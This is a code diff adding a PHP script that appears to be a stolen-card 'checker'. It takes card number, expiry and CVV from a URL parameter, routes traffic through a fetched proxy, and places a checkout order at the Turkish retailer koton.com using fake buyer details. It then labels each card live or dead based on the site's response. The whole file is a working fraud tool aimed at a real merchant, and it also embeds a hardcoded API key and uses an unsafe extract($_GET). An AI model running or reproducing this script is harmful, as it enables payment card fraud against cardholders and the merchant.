@@ -1,0 +1,233 @@
+<?php
+
+
+
+error_reporting(0);
+set_time_limit(0);
+
+
+$link = file_get_contents("https://api.getproxylist.com/proxy?apiKey=2769d07972701a1cb65b10f9565e205f3fcd463a&protocol=http&country=TR&lastTested=600");
+$link2 = json_decode($link);
+$link3 = $link2->ip;
+$link4 = $link2->port;
+$proxies = $link3.":".$link4;
+
+
+
+if (file_exists(getcwd().'/luciferasa.txt')) {
+            unlink(getcwd().'/luciferasa.txt');
+}
+
+//zepstar Discord LÝNK : https://discord.gg/BMjVWe7
+
+extract($_GET);
+$lista= str_replace(array(":", ";", ",", "|", "»", "/", "\\", " "), "|", $lista);
+$lista= str_replace(array("||", "|||"), "|", $lista);
+$lista= str_replace(array("||", "|||"), "|", $lista);
+$lista= str_replace(array("||", "|||"), "|", $lista);
+$lista= str_replace(array("||", "|||"), "|", $lista);
+$lista= str_replace(array("|19|"), "|2019|", $lista);
+$lista= str_replace(array("|20|"), "|2020|", $lista);
+$lista= str_replace(array("|21|"), "|2021|", $lista);
+$lista= str_replace(array("|22|"), "|2022|", $lista);
+$lista= str_replace(array("|23|"), "|2023|", $lista);
+$lista= str_replace(array("|24|"), "|2024|", $lista);
+$lista= str_replace(array("|25|"), "|2025|", $lista);
+$lista= str_replace(array("|26|"), "|2026|", $lista);
+$lista= str_replace(array("|27|"), "|2027|", $lista);
+$lista= str_replace(array("|28|"), "|2028|", $lista);
+$lista= str_replace(array("|29|"), "|2029|", $lista);
+$lista= str_replace(array("|01|"), "|1|", $lista);
+$lista= str_replace(array("|02|"), "|2|", $lista);
+$lista= str_replace(array("|03|"), "|3|", $lista);
+$lista= str_replace(array("|04|"), "|4|", $lista);
+$lista= str_replace(array("|05|"), "|5|", $lista);
+$lista= str_replace(array("|06|"), "|6|", $lista);
+$lista= str_replace(array("|07|"), "|7|", $lista);
+$lista= str_replace(array("|08|"), "|8|", $lista);
+$lista= str_replace(array("|09|"), "|9|", $lista);
+$separa = explode("|", $lista);
+$cc = trim($separa[0]);
+$mes = trim($separa[1]);
+$ano = trim($separa[2]);
+$cvv = trim($separa[3]);
+
+
+
+function proxy(){
+	$proxies = file("proxy.txt");
+    $proxy = rand(0, sizeof($proxies)-1);
+    $proxies = $proxies[$proxy];
+	return $proxies;
+}
+
+function dadossobre(){
+	$sobrenome = file("lista_sobrenomes.txt");
+    $mysobrenome = rand(0, sizeof($sobrenome)-1);
+    $sobrenome = $sobrenome[$mysobrenome];
+	return $sobrenome;
+}
+
+
+function adres(){
+	$adres = file("lista_adres.txt");
+    $myadres = rand(0, sizeof($adres)-1);
+    $adres = $adres[$myadres];
+	return $adres;
+}
+
+
+//function cookie(){
+	//$cookie = file("lista_cookies.txt");
+    //$cookies = rand(0, sizeof($cookie)-1);
+    //$cookie = $cookie[$cookies];
+	//return $cookie;
+//}
+
+
+
+function urun(){
+	$urun = file("urun1.txt");
+    $urunler = rand(0, sizeof($urun)-1);
+    $urun = $urun[$urunler];
+	return $urun;
+}
+
+
+function sepet(){
+	$sepet = file("sepet.txt");
+    $kaldir = rand(0, sizeof($sepet)-1);
+    $sepet = $sepet[$kaldir];
+	return $sepet;
+}
+
+
+
+
+function email($nome){
+	$email = preg_replace('<\W+>', "", "ahmet").rand(00000000,99999999)."@gmail.com";
+	return $email;
+}
+
+
+
+//$cpf = cpf(1);
+$proxy = proxy();
+$sobrenome = dadossobre();
+$email = email($nome);
+$adres = adres();
+//$cookie = cookie();
+$urun = urun();
+$sepet = sepet();
+
+
+
+    if (substr($cc[0], 0, 1) == '4') {
+        $tipi = 'Visa';
+    } else if (substr($cc[0], 0, 1) == '5') {
+        $tipi = 'MasterCard';
+    }
+
+echo $ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "https://www.koton.com/tr/cart/add");
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'Accept: */*',
+'Connection: keep-alive',
+'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
+'Host: www.koton.com',
+'Origin: https://www.koton.com',
+'Referer: https://www.koton.com/tr/kadin-3lu-kadin-corap/p/0KAK81130AA040T?productPosition=0&listName=Aksesuar%20Modelleri',
+'Sec-Fetch-Mode: cors',
+'Sec-Fetch-Site: same-origin',
+'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36',
+'X-Requested-With: XMLHttpRequest',
+));
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/luciferasa.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/luciferasa.txt');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'productCodePost=0KAM82224AA730T&qty=1');
+echo $fim = curl_exec($ch);
+
+
+
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "https://www.koton.com/tr/checkout/single/");
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+'Connection: keep-alive',
+'Host: www.koton.com',
+'Referer: https://www.koton.com/tr/login/checkout?pageType=CHECKOUT',
+'Sec-Fetch-Mode: navigate',
+'Sec-Fetch-Site: same-origin',
+'Sec-Fetch-User: ?1',
+'Upgrade-Insecure-Requests: 1',
+'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36',
+));
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/luciferasa.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/luciferasa.txt');
+echo $fim = curl_exec($ch);
+
+
+$number1 = substr($cc,0,4);
+$number2 = substr($cc,4,4);
+$number3 = substr($cc,8,4);
+$number4 = substr($cc,12,4);
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "https://www.koton.com/tr/checkout/single");
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+'Cache-Control: max-age=0',
+'Connection: keep-alive',
+'Content-Type: application/x-www-form-urlencoded',
+'Host: www.koton.com',
+'Origin: https://www.koton.com',
+'Referer: https://www.koton.com/tr/checkout/single/',
+'Sec-Fetch-Mode: navigate',
+'Sec-Fetch-Site: same-origin',
+'Sec-Fetch-User: ?1',
+'Upgrade-Insecure-Requests: 1',
+'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36',
+));
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/luciferasa.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/luciferasa.txt');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'firstName=awqsed&lastName=waqsed&email='.$email.'&deliveryAddress.firstName=awqsed&deliveryAddress.lastName=waqsed&deliveryAddress.line1=ewqatrfgewsdfrewasdrfewaqsdrf&deliveryAddress.line2=&deliveryAddress.countryIso=TR&deliveryAddress.townCity=ISTANBUL&deliveryAddress.province=ATASEHIR&deliveryAddress.postcode=34000&deliveryAddress.gsm=0554+156+41+65&invoiceAddress.firstName=awqsed&invoiceAddress.lastName=waqsed&invoiceAddress.line1=&invoiceAddress.line2=&invoiceAddress.countryIso=TR&invoiceAddress.postcode=&invoiceAddress.gsm=&useEinvoice=false&kotonPaymentForm.nationalId=&kotonPaymentForm.taxPayerId=&useFastDelivery=standardDeliveryRadio&kotonPaymentForm.fastDeliverySlotOption=tomorrow-am&selectShippingCompany=mngRadio&kotonPaymentForm.timeZone=GMT+%2B3&kotonPaymentForm.grossSubTotal=12.99&kotonPaymentForm.creditCard0='.$number1.'&kotonPaymentForm.creditCard1='.$number2.'&kotonPaymentForm.creditCard2='.$number3.'&kotonPaymentForm.creditCard3='.$number4.'&kotonPaymentForm.expirationDate%5B0%5D='.$mes.'&kotonPaymentForm.expirationDate%5B1%5D='.$ano.'&kotonPaymentForm.cvc2='.$cvv.'&kotonPaymentForm.installementCount=1&kotonPaymentForm.source=&kotonPaymentForm.policy=on&termsCheckCart=termsValue');
+$fim = curl_exec($ch);
+
+
+
+
+
+$oldMessage = "$proxy";
+$deletedFormat = "";
+
+
+$tarih = date("d.m.Y"); // Geçerli sistem tarihini almak için 
+
+
+$saat = date("H:i:s"); // Geçerli sistem saatini almak için 
+
+date_default_timezone_set('Etc/GMT-3');
+
+
+//$dosya = fopen('deneme.txt', 'r');
+//$icerik = fread($dosya, filesize('deneme.txt'));
+//$deneme = substr($icerik,1500,6000);
+//echo $deneme;
+//fclose($dosya);
+
+if(strpos($fim, 'MNG Kargo ile sevk edilecektir') !== false) {
+	echo "#Aktif › $cc $mes $ano $cvv  : KOTON TRY<br>";
+} else {
+	echo "#Kapali › $cc $mes $ano $cvv  : KOTON TRY<br>";
+}
+
+?>
